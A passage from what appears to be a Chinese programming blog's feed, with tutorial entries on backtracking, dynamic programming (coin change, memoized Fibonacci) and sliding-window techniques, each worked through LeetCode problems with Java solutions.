class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，跳过值相同的相邻树枝</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; start &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，固定相同的元素在排列中的相对位置</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式三、元素无重可复选，即 nums 中的元素都是唯一的，每个元素可以被使用若干次，只要删掉去重逻辑即可，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17.电话号码的字母组合"></a>17.电话号码的字母组合</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/description/">17. 电话号码的字母组合</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给定一个仅包含数字&nbsp;<code>2-9</code>&nbsp;的字符串，返回所有它能表示的字母组合。答案可以按 <strong>任意顺序</strong> 返回。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/11/09/200px-telephone-keypad2svg.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/11/09/200px-telephone-keypad2svg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 200px;"></p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>digits = "23"<strong>输出：</strong>["ad","ae","af","bd","be","bf","cd","ce","cf"]</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>digits = ""<strong>输出：</strong>[]</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>digits = "2"<strong>输出：</strong>["a","b","c"]</pre><p><strong>提示：</strong></p><ul>    <li><code>0 &lt;= digits.length &lt;= 4</code></li>    <li><code>digits[i]</code> 是范围 <code>['2', '9']</code> 的一个数字。</li></ul></div><ol><li><p>思路</p><blockquote><p>按题目，按键无重复值，并且是从头往后组合不可复选，可直接上回溯算法。</p></blockquote></li><li><p>解题方法</p><blockquote><p>把按钮的值存入数组，然后递归。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    String phone;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        String[] s = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>,<span class="string">&quot;ghi&quot;</span>,<span class="string">&quot;jkl&quot;</span>,<span class="string">&quot;mno&quot;</span>,<span class="string">&quot;pqrs&quot;</span>,<span class="string">&quot;tuv&quot;</span>,<span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">track</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        n = digits.length();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> ans;</span><br><span class="line">        phone = digits;</span><br><span class="line">        <span class="comment">// boolean[] used = new boolean[n];</span></span><br><span class="line">        backtracks(s, track, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracks</span><span class="params">(String[] s, String track, <span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (track.length() == n) &#123;</span><br><span class="line">            ans.add(track);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for(int i = start; i &lt; n; i++) &#123;</span></span><br><span class="line">            <span class="comment">// if(used[i]) continue;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c: s[phone.charAt(start) - <span class="string">&#x27;2&#x27;</span>].toCharArray()) &#123;</span><br><span class="line">                track += c;</span><br><span class="line">                <span class="comment">// used[i] = true;</span></span><br><span class="line">                backtracks(s, track, start + <span class="number">1</span>);</span><br><span class="line">                track = track.substring(<span class="number">0</span>, track.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="comment">// used[i] = false;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 回溯算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回溯算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划求最值问题</title>
      <link href="/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/"/>
      <url>/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。</p><p>动态规划的重点，就是如何确定 <code>状态转移方程</code> 和 通过 <code>备忘录</code> 空间换时间降低时间复杂度（优化穷举）。</p><span id="more"></span><p>以拿硬币举例，从 <code>1,2,5</code> 从拿硬币，求 <code>amount</code> 满足 <code>11</code> 时的最少硬币数量。</p><h5 id="状态转移方程构建"><a href="#状态转移方程构建" class="headerlink" title="状态转移方程构建"></a>状态转移方程构建</h5><p><strong>1.确定 base case</strong><br>即确定满足什么边界条件时 <code>return</code> 直接结束当前递归。<br>其中，例子的边界条件为：当 <code>amount == 0</code> 时 返回 <code>0</code>，当 <code>amount &lt; 0</code> 时无解，返回 <code>-1</code>。 </p><p><strong>2.确定 状态</strong><br>即原问题和子问题都会变化的变量。<br>其中，例子的状态为 <code>amount</code>，可以看出每拿走一个硬币 <code>amount</code> 就会改变，并向 <code>base case</code> 靠近，直至匹配。</p><p><strong>3.明确 选择</strong><br>即导致状态改变的行为。<br>其中，例子的选择为拿硬币。</p><p><strong>4.明确 dp 的定义</strong><br><code>dp</code> 函数即递归找最值的函数，递归一般分为 自顶向下 和 自底向上 两种，框架如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 自顶向下递归的动态规划</span><br><span class="line">def <span class="title function_">dp</span><span class="params">(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...)</span>:</span><br><span class="line">    <span class="keyword">for</span> 选择 in 所有可能的选择:</span><br><span class="line">        # 此时的状态已经因为做了选择而改变</span><br><span class="line">        result = 求最值(result, dp(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"># 自底向上迭代的动态规划</span><br><span class="line"># 初始化 base <span class="keyword">case</span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>][...] = base <span class="keyword">case</span></span><br><span class="line"># 进行状态转移</span><br><span class="line"><span class="keyword">for</span> 状态<span class="number">1</span> in 状态<span class="number">1</span>的所有取值：</span><br><span class="line">    <span class="keyword">for</span> 状态<span class="number">2</span> in 状态<span class="number">2</span>的所有取值：</span><br><span class="line">        <span class="keyword">for</span> ...</span><br><span class="line">            dp[状态<span class="number">1</span>][状态<span class="number">2</span>][...] = 求最值(选择<span class="number">1</span>，选择<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure><p>对比如下解法看出区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自顶向下</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自底向上</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 状态转移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="备忘录-memo"><a href="#备忘录-memo" class="headerlink" title="备忘录 memo"></a>备忘录 memo</h5><p>备忘录的作用，用于解决重复计算的问题。每次解决子问题的时候，先去备忘录查一下是否有结果，如果有直接使用，避免重复计算。例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 动态规划 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>滑动窗口找满足规则的区间问题</title>
      <link href="/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/"/>
      <url>/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>滑动窗口也为快慢指针。两个指针，<code>fast</code>指针在前面探路，<code>slow</code>指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间。</p><p>常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。</p><span id="more"></span><h5 id="滑动窗口算法框架"><a href="#滑动窗口算法框架" class="headerlink" title="滑动窗口算法框架"></a>滑动窗口算法框架</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 滑动窗口算法框架 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">slidingWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; need = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    HashMap&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : t.toCharArray()) need.put(c, need.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">valid</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">        <span class="comment">// 右移（增大）窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        <span class="keyword">if</span> (need.containsKey(c)) &#123;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (window.get(c).equals(need.get(c))) valid++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (window needs shrink) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">d</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line">            <span class="comment">// 左移（缩小）窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            <span class="keyword">if</span> (need.containsKey(d)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (window.get(d).equals(need.get(d))) valid--;</span><br><span class="line">                window.put(d, window.getOrDefault(d, <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2760-最长奇偶子数组"><a href="#2760-最长奇偶子数组" class="headerlink" title="2760. 最长奇偶子数组"></a>2760. 最长奇偶子数组</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/longest-even-odd-subarray-with-threshold/description/">2760. 最长奇偶子数组</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 和一个整数 <code>threshold</code> 。</p><p>请你从 <code>nums</code> 的子数组中找出以下标 <code>l</code> 开头、下标 <code>r</code> 结尾 <code>(0 &lt;= l &lt;= r &lt; nums.length)</code> 且满足以下条件的 <strong>最长子数组</strong> ：</p><ul>    <li><code>nums[l] % 2 == 0</code></li>    <li>对于范围&nbsp;<code>[l, r - 1]</code> 内的所有下标 <code>i</code> ，<code>nums[i] % 2 != nums[i + 1] % 2</code></li>    <li>对于范围&nbsp;<code>[l, r]</code> 内的所有下标 <code>i</code> ，<code>nums[i] &lt;= threshold</code></li></ul><p>以整数形式返回满足题目要求的最长子数组的长度。</p><p><strong>注意：子数组</strong> 是数组中的一个连续非空元素序列。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>nums = [3,2,5,4], threshold = 5<strong>输出：</strong>3<strong>解释：</strong>在这个示例中，我们选择从 l = 1 开始、到 r = 3 结束的子数组 =&gt; [2,5,4] ，满足上述条件。因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>nums = [1,2], threshold = 2<strong>输出：</strong>1<strong>解释：</strong>在这个示例中，我们选择从 l = 1 开始、到 r = 1 结束的子数组 =&gt; [2] 。该子数组满足上述全部条件。可以证明 1 是满足题目要求的最大长度。</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>nums = [2,3,4,5], threshold = 4<strong>输出：</strong>3<strong>解释：</strong>在这个示例中，我们选择从 l = 0 开始、到 r = 2 结束的子数组 =&gt; [2,3,4] 。 该子数组满足上述全部条件。因此，答案就是这个子数组的长度 3 。可以证明 3 是满足题目要求的最大长度。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= nums.length &lt;= 100 </code></li>    <li><code>1 &lt;= nums[i] &lt;= 100 </code></li>    <li><code>1 &lt;= threshold &lt;= 100</code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目求区间长度，区间设定了规则，那么用双指针，结合if匹配规则找出最大的区间长度即可。</p></blockquote></li><li><p>解题方法</p><blockquote><p>滑动窗口，在条件里满足所有设定规则即可</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(1)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestAlternatingSubarray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> threshold)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; n) &#123;</span><br><span class="line">            <span class="comment">// 先满足 nums[l] % 2 == 0</span></span><br><span class="line">            <span class="keyword">if</span> (nums[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(left &lt; n &amp;&amp; nums[left]  %<span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                right = left;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (right &gt;= n) <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 满足 nums[i] &lt;= threshold</span></span><br><span class="line">            <span class="keyword">if</span> (left == right &amp;&amp; nums[right] &lt;= threshold) &#123;</span><br><span class="line">                ans = Math.max(ans, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left == right &amp;&amp; nums[right] &gt; threshold) &#123;</span><br><span class="line">                right++;</span><br><span class="line">                left = right;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 满足 nums[i] % 2 != nums[i + 1] % 2</span></span><br><span class="line">            right++;</span><br><span class="line">            <span class="keyword">if</span>(right &lt; n &amp;&amp; (nums[right] % <span class="number">2</span> != nums[right-<span class="number">1</span>] % <span class="number">2</span>) &amp;&amp; nums[right] &lt;= threshold) &#123;</span><br><span class="line">                ans = Math.max(ans, right - left + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans != Integer.MIN_VALUE ? ans: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="632-最小区间"><a href="#632-最小区间" class="headerlink" title="632.最小区间"></a>632.最小区间</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/smallest-range-covering-elements-from-k-lists/description/">632. 最小区间</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>你有&nbsp;<code>k</code>&nbsp;个 <strong>非递减排列</strong> 的整数列表。找到一个 <strong>最小 </strong>区间，使得&nbsp;<code>k</code>&nbsp;个列表中的每个列表至少有一个数包含在其中。</p><p>我们定义如果&nbsp;<code>b-a &lt; d-c</code>&nbsp;或者在&nbsp;<code>b-a == d-c</code>&nbsp;时&nbsp;<code>a &lt; c</code>，则区间 <code>[a,b]</code> 比 <code>[c,d]</code> 小。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>nums = [[4,10,15,24,26], [0,9,12,20], [5,18,22,30]]<strong>输出：</strong>[20,24]<strong>解释：</strong> 列表 1：[4, 10, 15, 24, 26]，24 在区间 [20,24] 中。列表 2：[0, 9, 12, 20]，20 在区间 [20,24] 中。列表 3：[5, 18, 22, 30]，22 在区间 [20,24] 中。</pre><p><strong>示例 